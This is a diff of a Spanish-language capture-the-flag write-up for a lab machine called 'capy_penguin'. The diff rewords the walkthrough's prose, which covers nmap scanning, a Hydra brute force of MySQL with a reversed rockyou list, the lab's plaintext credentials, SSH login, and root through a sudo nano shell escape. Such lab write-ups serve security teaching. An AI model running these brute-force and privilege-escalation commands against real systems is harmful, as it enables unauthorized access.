@@ -7,9 +7,11 @@ img_path: /assets/img/dck/capy_penguin/
 image: /assets/img/dck/capy_penguin/capy_penguin.png
 ---
 
-## Reconocimiento
+Explotamos una vulnerabilidad en el servicio MySQL para obtener credenciales de acceso. Con estas credenciales, accedimos a la base de datos y obtuvimos información de usuario, que usamos para iniciar sesión en el sistema a través de SSH. Finalmente, aprovechamos un comando con privilegios elevados en `nano` para ejecutar una shell de root y obtener control total de la máquina.
 
-Empezamos realizando un escaneo a la máquina objetivo con nmap, para ver que puertos tiene abiertos.
+## Reconocimiento
+---
+Realizamos un escaneo de puertos en la máquina objetivo utilizando `nmap` para identificar los servicios en ejecución.
 
 ```bash
 nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
@@ -21,7 +23,7 @@ PORT     STATE SERVICE REASON
 ```
 
 ---
-Tiene abierto los puertos 22 (ssh), 80 (http) y 3306 (mysql). Ahora procedemos a lanzar un conjunto de script básicos y a verificar su versión.
+Los puertos identificados son **22 (SSH)**, **80 (HTTP)** y **3306 (MySQL)**. A continuación, realizamos un escaneo más detallado en estos puertos para obtener información adicional sobre los servicios y sus versiones.
 
 ```bash
 nmap -sCV -p22,80,3306 172.17.0.2 -oN targeted 
@@ -45,24 +47,21 @@ PORT     STATE SERVICE VERSION
 |   Salt: Hmof0ZTw|*X^NLqtr_fd
 |_  Auth Plugin Name: mysql_native_password
 ```
----
 ## Enumeración
-
-Como sabemos que tiene el servicio http corriendo por el puerto 80, vamos a revisar la página web en busca de información relevante, e incluso inspeccionar el código.
+---
+Dado que el puerto 80 está abierto y ejecutando un servidor HTTP, exploramos la página web en busca de información útil o posibles puntos de entrada.
 
 ![capy_penguin-1](/assets/img/dck/capy_penguin/capy_penguin-1.png)
 
 ---
-Encontramos a un posible usuario llamado "capybarauser", y que la contraseña se encuentra en las ultimas palabras del rockyou, y usaremos "tac" para que nos devuelva el contenido inverso.
+Exploramos la página web y encontramos referencias a un usuario potencialmente válido, **capybarauser**. Además, se menciona que la contraseña está en las últimas palabras del diccionario **rockyou.txt**. Para facilitar la búsqueda, invertimos el contenido del archivo usando `tac`.
 
 ```bash
 tac /usr/share/wordlists/rockyou.txt > RockyouInvertido.txt
 ```
----
-
 ## Explotación
-
-Ahora con ayuda de la herramienta hydra, procederemos a realizar un ataque de fuerza bruta al usuario "capybarauser" contra el servicio de mysql, usando este nuevo diccionario.
+---
+Con la información recopilada, realizamos un ataque de fuerza bruta al servicio MySQL utilizando `Hydra`, intentando acceder con el usuario **capybarauser** y el diccionario invertido.
 
 ```bash
 hydra -l capybarauser -P RockyouInvertido.txt mysql://172.17.0.2 -t 4
@@ -72,15 +71,15 @@ _______________________________________________________________________
 1 of 1 target successfully completed, 1 valid password found
 ```
 ---
-Logramos encontrar la contraseña, ahora procedemos a usar estas credenciales para conectarnos al mysql de la máquina objetivo.
+El ataque fue exitoso, y encontramos las credenciales. Ahora nos conectamos a la base de datos MySQL utilizando las credenciales obtenidas.
 
 ```bash
 mysql -h 172.17.0.2 -u capybarauser -pie168
 _______________________________________________________________________
 MariaDB [(none)]> 
 ```
-
-Una vez dentro, comenzamos a enumerar la base de datos.
+---
+Una vez dentro de MySQL, comenzamos la enumeración de las bases de datos disponibles.
 
 ```sql
 MariaDB [(none)]> SHOW DATABASES;
@@ -96,8 +95,9 @@ _______________________________________________________________________
 +--------------------+
 5 rows in set (0.003 sec)
 ```
+---
+Encontramos la base de datos **pinguinasio_db**, y dentro de ella, identificamos la tabla **users**.
 
-Encontramos la base de datos pinguinasio_db, así que usaremos esa y mostraremos las tablas.
 ```sql
 MariaDB [(none)]> USE pinguinasio_db;
 --------------------------------------------------
@@ -110,8 +110,9 @@ _______________________________________________________________________
 +--------------------------+
 1 row in set (0.000 sec)
 ```
+---
+Exploramos el contenido de la tabla **users** para obtener más información.
 
-Vamos a ver todas las columnas de la tabla users.
 ```sql
 MariaDB [pinguinasio_db]> SELECT * FROM users;
 _______________________________________________________________________
@@ -122,9 +123,8 @@ _______________________________________________________________________
 +----+-------+------------------+
 1 row in set (0.000 sec)
 ```
-
 ---
-Vemos que existe un usuario llamado "mario" con su contaseña "pinguinomolon123". Posiblemente podemos usarlo para conectarnos por SSH.
+Encontramos a un usuario llamado **mario** con la contraseña **pinguinomolon123**. Con las credenciales obtenidas, intentamos conectarnos al servidor mediante SSH.
 
 ```bash
 ssh mario@172.17.0.2
@@ -132,8 +132,8 @@ mario@172.17.0.2's password: pinguinomolon123
 _______________________________________________________________________
 mario@54bec2b5e6ff:~$ 
 ```
-
-Logramos tener acceso a la máquina objetivo, ahora haremos un Tratamiento de la TTY para poder trabajar cómodamente por la consola.
+---
+Logramos acceder a la máquina objetivo. Ahora, preparamos la TTY para trabajar cómodamente en la consola.
 
 ```bash
 script /dev/null -c bash
@@ -144,26 +144,25 @@ export TERM=xterm
 export SHELL=bash
 stty rows 41 columns 183
 ```
----
-
 ## Escalada de Privilegios
-
-Ahora procederemos a hacer una escala de privilegios. Lista los comandos que un usuario puede ejecutar con privilegios elevados.
+---
+Para la escalada de privilegios, listamos los comandos que el usuario puede ejecutar con privilegios elevados.
 
 ```bash
 mario@54bec2b5e6ff:~$ sudo -l
 _______________________________________________________________________
     (ALL : ALL) NOPASSWD: /usr/bin/nano
 ```
+---
+Vemos que podemos ejecutar **nano** como root sin proporcionar contraseña. Utilizamos [GTFObins](https://gtfobins.github.io/) para determinar el procedimiento a seguir.
 
-Vemos que podemos ejecutar nano como el usuario root, sin proporcionar contraseña, nos ayudaremos de GTFObins para ver el procedimiento que debemos realizar.
 ```bash
 sudo nano
 # Adentro de Nano presionamos Ctrl+R y luego Ctrl+X
 reset; bash 1>&0 2>&0
 ```
 
-Y logramos conseguir ser root en la máquina objetivo.
+Logramos obtener una shell como root en la máquina objetivo.
 ```bash
 root@54bec2b5e6ff:/home/mario# whoami
 _______________________________________________________________________
